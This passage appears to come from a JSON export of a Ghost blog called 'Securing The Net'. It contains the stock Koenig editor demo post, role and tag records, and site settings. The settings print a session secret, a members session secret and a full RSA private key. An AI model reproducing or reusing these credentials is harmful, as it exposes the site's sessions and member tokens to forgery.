Demo Post","slug":"v2-demo-post","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"hr\",{}],[\"embed\",{\"url\":\"https://twitter.com/TryGhost/status/761119175192420352\",\"html\":\"<blockquote class=\\\"twitter-tweet\\\"><p lang=\\\"en\\\" dir=\\\"ltr\\\">Fun announcement coming this afternoon 🙈 what could it be?</p>&mdash; Ghost (@TryGhost) <a href=\\\"https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw\\\">August 4, 2016</a></blockquote>\\n<script async src=\\\"https://platform.twitter.com/widgets.js\\\" charset=\\\"utf-8\\\"></script>\\n\",\"type\":\"rich\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-1.jpg\",\"alt\":\"\",\"caption\":\"A regular size image\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-2.jpg\",\"alt\":\"\",\"cardWidth\":\"full\",\"caption\":\"It's wide\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-3.jpg\",\"alt\":\"\",\"cardWidth\":\"wide\",\"caption\":\"It's wider, but not widest\"}],[\"markdown\",{\"markdown\":\"Markdown content works just the way it always did, **simply** and *beautifully*.\"}],[\"code\",{\"code\":\".new-editor {\\n\\tdisplay: bock;\\n}\"}],[\"embed\",{\"url\":\"https://www.youtube.com/watch?v=CfeQTuGyiqU\",\"html\":\"<iframe width=\\\"480\\\" height=\\\"270\\\" src=\\\"https://www.youtube.com/embed/CfeQTuGyiqU?feature=oembed\\\" frameborder=\\\"0\\\" allow=\\\"autoplay; encrypted-media\\\" allowfullscreen></iframe>\",\"type\":\"video\"}],[\"html\",{\"html\":\"<div style=\\\"background:#fafafa;margin-bottom:1.5em;padding:20px 50px;\\\">\\n    <blink>hello world</blink>\\n</div>\"}]],\"markups\":[[\"strong\"],[\"code\"],[\"em\"],[\"a\",[\"href\",\"https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hey there! Welcome to the new Ghost editor - affectionately known as \"],[0,[0],1,\"Koenig\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Koenig is a brand new writing experience within Ghost, and follows more of a rich writing experience which you've come to expect from the best publishing platforms. Don't worry though! You can still use Markdown too, if that's what you prefer.\"]]],[1,\"p\",[[0,[],0,\"Because there are some changes to how Ghost outputs content using its new editor, we dropped this draft post into your latest update to tell you a bit about it – and simultaneously give you a chance to preview how well your theme handles these changes. So after reading this post you should both understand how everything works, and also be able to see if there are any changes you need to make to your theme in order to upgrade to Ghost 2.0.\"]]],[10,0],[1,\"h1\",[[0,[],0,\"What's new\"]]],[1,\"p\",[[0,[],0,\"The new editor is designed to allow you have a more rich editing experience, so it's no longer limited to just text and formatting options – but it can also handle rich media objects, called cards. You can insert a card either by clicking on the \"],[0,[1],1,\"+\"],[0,[],0,\" button on a new line, or typing \"],[0,[1],1,\"/\"],[0,[],0,\" on a new line to search for a particular card. \"]]],[1,\"p\",[[0,[],0,\"Here's one now:\"]]],[10,1],[1,\"p\",[[0,[],0,\"Cards are rich objects which contain content which is more than just text. To start with there are cards for things like images, markdown, html and embeds — but over time we'll introduce more cards and integrations, as well as allowing you to create your own!\"]]],[1,\"h2\",[[0,[],0,\"Some examples of possible future cards\"]]],[3,\"ul\",[[[0,[],0,\"A chart card to display dynamic data visualisations\"]],[[0,[],0,\"A recipe card to show a pre-formatted list of ingredients and instructions\"]],[[0,[],0,\"A Mailchimp card to capture new subscribers with a web form\"]],[[0,[],0,\"A recommended reading card to display a dynamic suggested story based on the current user's reading history\"]]]],[1,\"p\",[[0,[],0,\"For now, though, we're just getting started with the basics.\"]]],[1,\"h1\",[[0,[],0,\"New ways to work with images\"]]],[1,\"p\",[[0,[],0,\"Perhaps the most notable change to how you're used to interacting with Ghost is in the images. In Koenig, they're both more powerful and easier to work with in the editor itself - and in the theme, they're output slightly differently with different size options.\"]]],[1,\"p\",[[0,[],0,\"For instance, here's your plain ol' regular image:\"]]],[10,2],[1,\"p\",[[0,[],0,\"But perhaps you've got a striking panorama that you really want to stand out as your readers scroll down the page. In that case, you could use the new full-bleed image size which stretches right out to the edges of the screen:\"]]],[10,3],[1,\"p\",[[0,[],0,\"Or maybe you're looking for something in between, which will give you just a little more size to break up the vertical rhythm of the post without dominating the entire screen. If that's the case, you might like the breakout size:\"]]],[10,4],[1,\"p\",[[0,[],0,\"Each of these sizes can be selected from within the editor, and each will output a number of HTML classes for the theme to do styling with. \"]]],[1,\"p\",[[0,[],0,\"Chances are your theme will need a few small updates to take advantage of the new editor functionality. Some people might also find they need to tweak their theme layout, as the editor canvas previously output a wrapper div around its content – but no longer does. If you rely on that div for styling, you can always add it back again in your theme.\"]]],[1,\"p\",[[0,[],0,\"Oh, we have some nice new image captions, too :)\"]]],[1,\"h1\",[[0,[],0,\"What else?\"]]],[1,\"p\",[[0,[],0,\"Well, you can still write Markdown, as mentioned. In fact you'll find the entire previous Ghost editor \"],[0,[2],1,\"inside\"],[0,[],0,\" this editor. If you want to use it then just go ahead and add a Markdown card and start writing like nothing changed at all:\"]]],[10,5],[1,\"p\",[[0,[],0,\"of course you can embed code blocks\"]]],[10,6],[1,\"p\",[[0,[],0,\"or embed things from external services like YouTube...\"]]],[10,7],[1,\"p\",[[0,[],0,\"and yeah you can do full HTML if you need to, as well!\"]]],[10,8],[1,\"p\",[[0,[],0,\"So everything works, hopefully, just about how you would expect. It's like the old editor, but faster, cleaner, prettier, and a whole lot more powerful.\"]]],[1,\"h1\",[[0,[],0,\"What do I do with this information?\"]]],[1,\"p\",[[0,[],0,\"Preview this post on your site to see if it causes any issues with your theme. Click on the settings cog in the top right 👉🏼 corner of the editor, then click on '\"],[0,[0],1,\"Preview\"],[0,[],0,\"' next to the 'Post URL' input.\"]]],[1,\"p\",[[0,[],0,\"If everything looks good to you then there's nothing you need to do, you're all set! If you spot any issues with your design, or there are some funky display issues, then you might need to make some updates to your theme based on the new editor classes being output.\"]]],[1,\"p\",[[0,[],0,\"Head over to the \"],[0,[3],1,\"Ghost 2.0 Theme Compatibility\"],[0,[],0,\" forum topic to discuss any changes and get help if needed.\"]]],[1,\"p\",[[0,[],0,\"That's it!\"]]],[1,\"p\",[[0,[],0,\"We're looking forward to sharing more about the new editor soon\"]]]]}","html":"<p>Hey there! Welcome to the new Ghost editor - affectionately known as <strong>Koenig</strong>.</p><p>Koenig is a brand new writing experience within Ghost, and follows more of a rich writing experience which you've come to expect from the best publishing platforms. Don't worry though! You can still use Markdown too, if that's what you prefer.</p><p>Because there are some changes to how Ghost outputs content using its new editor, we dropped this draft post into your latest update to tell you a bit about it – and simultaneously give you a chance to preview how well your theme handles these changes. So after reading this post you should both understand how everything works, and also be able to see if there are any changes you need to make to your theme in order to upgrade to Ghost 2.0.</p><hr><h1 id=\"what-s-new\">What's new</h1><p>The new editor is designed to allow you have a more rich editing experience, so it's no longer limited to just text and formatting options – but it can also handle rich media objects, called cards. You can insert a card either by clicking on the <code>+</code> button on a new line, or typing <code>/</code> on a new line to search for a particular card. </p><p>Here's one now:</p><figure class=\"kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Fun announcement coming this afternoon 🙈 what could it be?</p>&mdash; Ghost (@TryGhost) <a href=\"https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw\">August 4, 2016</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>Cards are rich objects which contain content which is more than just text. To start with there are cards for things like images, markdown, html and embeds — but over time we'll introduce more cards and integrations, as well as allowing you to create your own!</p><h2 id=\"some-examples-of-possible-future-cards\">Some examples of possible future cards</h2><ul><li>A chart card to display dynamic data visualisations</li><li>A recipe card to show a pre-formatted list of ingredients and instructions</li><li>A Mailchimp card to capture new subscribers with a web form</li><li>A recommended reading card to display a dynamic suggested story based on the current user's reading history</li></ul><p>For now, though, we're just getting started with the basics.</p><h1 id=\"new-ways-to-work-with-images\">New ways to work with images</h1><p>Perhaps the most notable change to how you're used to interacting with Ghost is in the images. In Koenig, they're both more powerful and easier to work with in the editor itself - and in the theme, they're output slightly differently with different size options.</p><p>For instance, here's your plain ol' regular image:</p><figure class=\"kg-image-card\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-1.jpg\" class=\"kg-image\"><figcaption>A regular size image</figcaption></figure><p>But perhaps you've got a striking panorama that you really want to stand out as your readers scroll down the page. In that case, you could use the new full-bleed image size which stretches right out to the edges of the screen:</p><figure class=\"kg-image-card kg-width-full\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-2.jpg\" class=\"kg-image\"><figcaption>It's wide</figcaption></figure><p>Or maybe you're looking for something in between, which will give you just a little more size to break up the vertical rhythm of the post without dominating the entire screen. If that's the case, you might like the breakout size:</p><figure class=\"kg-image-card kg-width-wide\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-3.jpg\" class=\"kg-image\"><figcaption>It's wider, but not widest</figcaption></figure><p>Each of these sizes can be selected from within the editor, and each will output a number of HTML classes for the theme to do styling with. </p><p>Chances are your theme will need a few small updates to take advantage of the new editor functionality. Some people might also find they need to tweak their theme layout, as the editor canvas previously output a wrapper div around its content – but no longer does. If you rely on that div for styling, you can always add it back again in your theme.</p><p>Oh, we have some nice new image captions, too :)</p><h1 id=\"what-else\">What else?</h1><p>Well, you can still write Markdown, as mentioned. In fact you'll find the entire previous Ghost editor <em>inside</em> this editor. If you want to use it then just go ahead and add a Markdown card and start writing like nothing changed at all:</p><p>Markdown content works just the way it always did, <strong>simply</strong> and <em>beautifully</em>.</p>\n<p>of course you can embed code blocks</p><pre><code>.new-editor {\n\tdisplay: bock;\n}</code></pre><p>or embed things from external services like YouTube...</p><figure class=\"kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/CfeQTuGyiqU?feature=oembed\" frameborder=\"0\" allow=\"autoplay; encrypted-media\" allowfullscreen></iframe></figure><p>and yeah you can do full HTML if you need to, as well!</p><div style=\"background:#fafafa;margin-bottom:1.5em;padding:20px 50px;\">\n    <blink>hello world</blink>\n</div><p>So everything works, hopefully, just about how you would expect. It's like the old editor, but faster, cleaner, prettier, and a whole lot more powerful.</p><h1 id=\"what-do-i-do-with-this-information\">What do I do with this information?</h1><p>Preview this post on your site to see if it causes any issues with your theme. Click on the settings cog in the top right 👉🏼 corner of the editor, then click on '<strong>Preview</strong>' next to the 'Post URL' input.</p><p>If everything looks good to you then there's nothing you need to do, you're all set! If you spot any issues with your design, or there are some funky display issues, then you might need to make some updates to your theme based on the new editor classes being output.</p><p>Head over to the <a href=\"https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103\">Ghost 2.0 Theme Compatibility</a> forum topic to discuss any changes and get help if needed.</p><p>That's it!</p><p>We're looking forward to sharing more about the new editor soon</p>","amp":null,"plaintext":"Hey there! Welcome to the new Ghost editor - affectionately known as Koenig.\n\nKoenig is a brand new writing experience within Ghost, and follows more of a\nrich writing experience which you've come to expect from the best publishing\nplatforms. Don't worry though! You can still use Markdown too, if that's what\nyou prefer.\n\nBecause there are some changes to how Ghost outputs content using its new\neditor, we dropped this draft post into your latest update to tell you a bit\nabout it – and simultaneously give you a chance to preview how well your theme\nhandles these changes. So after reading this post you should both understand how\neverything works, and also be able to see if there are any changes you need to\nmake to your theme in order to upgrade to Ghost 2.0.\n\n\n--------------------------------------------------------------------------------\n\nWhat's new\nThe new editor is designed to allow you have a more rich editing experience, so\nit's no longer limited to just text and formatting options – but it can also\nhandle rich media objects, called cards. You can insert a card either by\nclicking on the +  button on a new line, or typing /  on a new line to search\nfor a particular card. \n\nHere's one now:\n\nFun announcement coming this afternoon 🙈 what could it be?\n\n— Ghost (@TryGhost) August 4, 2016\n[https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw]\nCards are rich objects which contain content which is more than just text. To\nstart with there are cards for things like images, markdown, html and embeds —\nbut over time we'll introduce more cards and integrations, as well as allowing\nyou to create your own!\n\nSome examples of possible future cards\n * A chart card to display dynamic data visualisations\n * A recipe card to show a pre-formatted list of ingredients and instructions\n * A Mailchimp card to capture new subscribers with a web form\n * A recommended reading card to display a dynamic suggested story based on the\n   current user's reading history\n\nFor now, though, we're just getting started with the basics.\n\nNew ways to work with images\nPerhaps the most notable change to how you're used to interacting with Ghost is\nin the images. In Koenig, they're both more powerful and easier to work with in\nthe editor itself - and in the theme, they're output slightly differently with\ndifferent size options.\n\nFor instance, here's your plain ol' regular image:\n\nA regular size imageBut perhaps you've got a striking panorama that you really\nwant to stand out as your readers scroll down the page. In that case, you could\nuse the new full-bleed image size which stretches right out to the edges of the\nscreen:\n\nIt's wideOr maybe you're looking for something in between, which will give you\njust a little more size to break up the vertical rhythm of the post without\ndominating the entire screen. If that's the case, you might like the breakout\nsize:\n\nIt's wider, but not widestEach of these sizes can be selected from within the\neditor, and each will output a number of HTML classes for the theme to do\nstyling with. \n\nChances are your theme will need a few small updates to take advantage of the\nnew editor functionality. Some people might also find they need to tweak their\ntheme layout, as the editor canvas previously output a wrapper div around its\ncontent – but no longer does. If you rely on that div for styling, you can\nalways add it back again in your theme.\n\nOh, we have some nice new image captions, too :)\n\nWhat else?\nWell, you can still write Markdown, as mentioned. In fact you'll find the entire\nprevious Ghost editor inside  this editor. If you want to use it then just go\nahead and add a Markdown card and start writing like nothing changed at all:\n\nMarkdown content works just the way it always did, simply  and beautifully.\n\nof course you can embed code blocks\n\n.new-editor {\n\tdisplay: bock;\n}\n\nor embed things from external services like YouTube...\n\nand yeah you can do full HTML if you need to, as well!\n\nhello worldSo everything works, hopefully, just about how you would expect. It's\nlike the old editor, but faster, cleaner, prettier, and a whole lot more\npowerful.\n\nWhat do I do with this information?\nPreview this post on your site to see if it causes any issues with your theme.\nClick on the settings cog in the top right 👉🏼 corner of the editor, then click\non 'Preview' next to the 'Post URL' input.\n\nIf everything looks good to you then there's nothing you need to do, you're all\nset! If you spot any issues with your design, or there are some funky display\nissues, then you might need to make some updates to your theme based on the new\neditor classes being output.\n\nHead over to the Ghost 2.0 Theme Compatibility\n[https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103] \nforum topic to discuss any changes and get help if needed.\n\nThat's it!\n\nWe're looking forward to sharing more about the new editor soon","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-02-25T04:44:04.000Z","created_by":"1","updated_at":"2019-02-25T04:44:04.000Z","updated_by":"1","published_at":null,"published_by":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null}],"posts_authors":[{"id":"5c737294c9ab231b9b27667f","post_id":"5aa2cad77c677a73cedb4bdb","author_id":"1","sort_order":0},{"id":"5c737294c9ab231b9b276680","post_id":"5abdb90f14ea58067217fadd","author_id":"1","sort_order":0},{"id":"5c737294c9ab231b9b276681","post_id":"5aebd5332d4a58064640a1b8","author_id":"1","sort_order":0},{"id":"5c737294c9ab231b9b276682","post_id":"5c73702abd888c0685801291","author_id":"1","sort_order":0},{"id":"5c737294c9ab231b9b276684","post_id":"5c737294c9ab231b9b276683","author_id":"1","sort_order":0}],"posts_tags":[{"id":"5aa2d0877c677a73cedb4be2","post_id":"5aa2cad77c677a73cedb4bdb","tag_id":"5aa2cfae7c677a73cedb4bdd","sort_order":0},{"id":"5aa2d0877c677a73cedb4be3","post_id":"5aa2cad77c677a73cedb4bdb","tag_id":"5aa2cfca7c677a73cedb4bde","sort_order":1},{"id":"5aa2d0877c677a73cedb4be4","post_id":"5aa2cad77c677a73cedb4bdb","tag_id":"5aa2cfef7c677a73cedb4be1","sort_order":2},{"id":"5abe267014ea58067217fae3","post_id":"5abdb90f14ea58067217fadd","tag_id":"5aa2cfd27c677a73cedb4bdf","sort_order":0},{"id":"5aed1c062d4a58064640a1bd","post_id":"5aebd5332d4a58064640a1b8","tag_id":"5aed1c062d4a58064640a1bb","sort_order":0},{"id":"5aed1c062d4a58064640a1be","post_id":"5aebd5332d4a58064640a1b8","tag_id":"5aed1c062d4a58064640a1bc","sort_order":1}],"roles":[{"id":"5aa2ac4322b8aa7378ad97c7","name":"Administrator","description":"Administrators","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2018-03-09T15:46:11.000Z","updated_by":"1"},{"id":"5aa2ac4322b8aa7378ad97c8","name":"Editor","description":"Editors","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2018-03-09T15:46:11.000Z","updated_by":"1"},{"id":"5aa2ac4322b8aa7378ad97c9","name":"Author","description":"Authors","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2018-03-09T15:46:11.000Z","updated_by":"1"},{"id":"5aa2ac4322b8aa7378ad97ca","name":"Contributor","description":"Contributors","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2018-03-09T15:46:11.000Z","updated_by":"1"},{"id":"5aa2ac4322b8aa7378ad97cb","name":"Owner","description":"Blog Owner","created_at":"2018-03-09T15:46:11.000Z","created_by":"1","updated_at":"2018-03-09T15:46:11.000Z","updated_by":"1"}],"roles_users":[{"id":"5aa2ac4422b8aa7378ad9801","role_id":"5aa2ac4322b8aa7378ad97c9","user_id":"5951f5fca366002ebd5dbef7"},{"id":"5aa2ac4422b8aa7378ad9883","role_id":"5aa2ac4322b8aa7378ad97cb","user_id":"1"}],"settings":[{"id":"5aa2ac4b7c677a73cedb4bbd","key":"db_hash","value":"59fe0d34-d0e0-4476-9c23-32506bb6e65e","type":"core","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bbe","key":"next_update_check","value":"1551154955","type":"core","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2019-02-25T04:22:34.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bbf","key":"notifications","value":"[{\"dismissible\":true,\"location\":\"bottom\",\"status\":\"alert\",\"id\":\"598d6bc0-7ede-11e8-a91c-1dd6e838df46\",\"custom\":false,\"createdAt\":\"2018-07-03T15:30:08.000Z\",\"type\":\"info\",\"top\":false,\"message\":\"Ghost <a href=\\\"https://github.com/TryGhost/Ghost/releases\\\">1.24.7</a> has been released, <a href=\\\"https://docs.ghost.org/docs/upgrade\\\">click here</a> to upgrade.\",\"seen\":false,\"addedAt\":\"2018-07-03T23:49:45.103Z\"},{\"dismissible\":true,\"location\":\"bottom\",\"status\":\"alert\",\"id\":\"045f7e0c-5305-44bf-8b32-6f955d461234\",\"custom\":true,\"createdAt\":\"2018-08-21T19:07:32.000Z\",\"type\":\"info\",\"top\":true,\"message\":\"<strong>Ghost 2.0 is now available</strong> You are currently using an old version of Ghost which means you don't have access to the latest features. <a href=\\\"https://blog.ghost.org/2-0/\\\" target=\\\"_blank\\\" rel=\\\"noopener\\\">Read more!</a>\",\"seen\":false,\"addedAt\":\"2018-09-15T07:02:49.111Z\"}]","type":"core","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-09-15T07:02:49.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc0","key":"title","value":"Securing The Net","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:54:07.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc1","key":"description","value":"Blue Teamers unite!","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:52:30.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc2","key":"logo","value":"","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:54:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc3","key":"cover_image","value":"https://casper.ghost.org/v1.0.0/images/blog-cover.jpg","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc4","key":"icon","value":"","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc5","key":"default_locale","value":"en","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc6","key":"active_timezone","value":"Etc/UTC","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc7","key":"force_i18n","value":"true","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bc9","key":"amp","value":"true","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bca","key":"ghost_head","value":"<link href=\"https://cdnjs.cloudflare.com/ajax/libs/prism/0.0.1/prism.min.css\" rel=\"stylesheet\" />","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T19:14:43.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bcb","key":"ghost_foot","value":"<script type=\"text/javascript\" src=\"https://cdnjs.cloudflare.com/ajax/libs/prism/0.0.1/prism.min.js\" ></script>","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T19:14:43.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bcc","key":"facebook","value":"","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bcd","key":"twitter","value":"@aj_mcquay","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:55:13.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bce","key":"labs","value":"{\"publicAPI\": true}","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bcf","key":"navigation","value":"[{\"label\":\"Home\",\"url\":\"/\"}]","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:52:30.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd0","key":"slack","value":"[{\"url\":\"\"}]","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd1","key":"unsplash","value":"{\"isActive\":true}","type":"blog","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T17:52:30.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd2","key":"active_theme","value":"casper","type":"theme","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2019-02-25T04:36:40.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd3","key":"active_apps","value":"[]","type":"app","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd4","key":"installed_apps","value":"[]","type":"app","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd5","key":"is_private","value":"false","type":"private","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd6","key":"password","value":"","type":"private","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5aa2ac4b7c677a73cedb4bd7","key":"public_hash","value":"cfe9760bf1e7faa6074c2457b816bd","type":"private","created_at":"2018-03-09T15:46:19.000Z","created_by":"1","updated_at":"2018-03-09T15:46:19.000Z","updated_by":"1"},{"id":"5c7372f32ac21c1cf0c27d8e","key":"session_secret","value":"a1f7e5f04010c340ef380b955ba3ac7a118e31cc9e2eedb435019c7c462162c0","type":"core","created_at":"2019-02-25T04:45:39.000Z","created_by":"1","updated_at":"2019-02-25T04:45:39.000Z","updated_by":"1"},{"id":"5c7372f32ac21c1cf0c27d8f","key":"members_public_key","value":"-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAJ3P1hufwP4BYqVvxBKYBM6xfSFrDQc4b9MjLg2P9z88E6Z05dEr2nLguDzkLaI+\ngrWXVKCLD6KBw4w07F9YfXBmw6dA5VOpRh1lOIT8zPDi8Fh14gYEYjTqDx6mY0+S4bcruf4I\nJG+6rNn53k5/FzdeGuDvgIy/1y+kQshAin29AgMBAAE=\n-----END RSA PUBLIC KEY-----\n","type":"members","created_at":"2019-02-25T04:45:39.000Z","created_by":"1","updated_at":"2019-02-25T04:45:39.000Z","updated_by":"1"},{"id":"5c7372f32ac21c1cf0c27d90","key":"members_private_key","value":"-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQCdz9Ybn8D+AWKlb8QSmATOsX0haw0HOG/TIy4Nj/c/PBOmdOXRK9py4Lg8\n5C2iPoK1l1Sgiw+igcOMNOxfWH1wZsOnQOVTqUYdZTiE/Mzw4vBYdeIGBGI06g8epmNPkuG3\nK7n+CCRvuqzZ+d5Ofxc3Xhrg74CMv9cvpELIQIp9vQIDAQABAoGAezbH49+Sjn/EZojiHOZm\ncn8vxMTRcj7FSKOiFGLAV7XvXbrNqMhFkgYUsy4w1wlZgrC6GXMZ7PbGGBVGLJdpr/tS2y4b\n5D/7ltGZ/WgtFJaN7Z1nDdDyfNwKYGrkOvO7y/k9266wsajixE1y9POZNDGINyI3dmr8N1Qj\nVrBIBcECQQDX0SVOcUTRx0B5+z1GHCOOKt8/0kN4B7q0yEdpJLrrZUzp4Ppq/su5f+IoPVaR\nu3N1WD97Il/PwBX5Gn27x4WtAkEAuzHkuiD+8qH+x0iXiUAs0NbDWrr8zvt0r+egNu6xbo2D\nCsKcZgv6dYOTFPAwfmAfuyuuUz/1haXKQ4QsLqA6UQJANjDF9VRru2EUx4xWbmxSYThSpmvd\nlR4bu5kulTAr3z+oeHGNb6Ba91EtMH12Z1FyRFzMU9blx/yrh8knGSeYYQJAVV01TuPJH2Bc\nTQh/gilvxnSJdZCbxM/KsITR/PrwkteZkIiaxbZkqr4rjnrRwm+XSMVso64hCqdGC2/0rfaH\nYQJBALJijazzv6oxLXoDv1OI7BsqaWXter5Anxomm7qbQr1eFGCsIWqgxo+w4ykjP0kkxNlG\nHuS8T/Ln8kQcfJkQn2Y=\n-----END RSA PRIVATE KEY-----\n","type":"members","created_at":"2019-02-25T04:45:39.000Z","created_by":"1","updated_at":"2019-02-25T04:45:39.000Z","updated_by":"1"},{"id":"5c7372f32ac21c1cf0c27d91","key":"members_session_secret","value":"de2e55e6caec3cedb3f04f64128549a61b2193a3dec11c556e0a40ca30acf0ea","type":"members","created_at":"2019-02-25T04:45:39.000Z","created_by":"1","updated_at":"2019-02-25T04:45:39.000Z","updated_by":"1"}],"subscribers":[],"tags":[{"id":"5aa2cfae7c677a73cedb4bdd","name":"Ansible","slug":"ansible","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-03-09T18:17:18.000Z","created_by":"1","updated_at":"2018-03-09T19:20:08.000Z","updated_by":"1"},{"id":"5aa2cfca7c677a73cedb4bde","name":"Automation","slug":"automation","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-03-09T18:17:46.000Z","created_by":"1","updated_at":"2018-03-09T19:20:08.000Z","updated_by":"1"},{"id":"5aa2cfd27c677a73cedb4bdf","name":"Opinion","slug":"opinion","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-03-09T18:17:54.000Z","created_by":"1","updated_at":"2018-03-30T12:43:13.000Z","updated_by":"1"},{"id":"5aa2cfd97c677a73cedb4be0","name":"News","slug":"news","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-03-09T18:18:01.000Z","created_by":"1","updated_at":"2018-03-09T18:18:01.000Z","updated_by":"1"},{"id":"5aa2cfef7c677a73cedb4be1","name":"Tools","slug":"tools","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-03-09T18:18:23.000Z","created_by":"1","updated_at":"2018-03-09T19:20:08.000Z","updated_by":"1"},{"id":"5aed1c062d4a58064640a1bb","name":"Linux","slug":"linux","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-05-05T02:50:46.000Z","created_by":"1","updated_at":"2018-05-05T02:54:53.000Z","updated_by":"1"},{"id":"5aed1c062d4a58064640a1bc","name":"HackTheBox","slug":"hackthebox","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"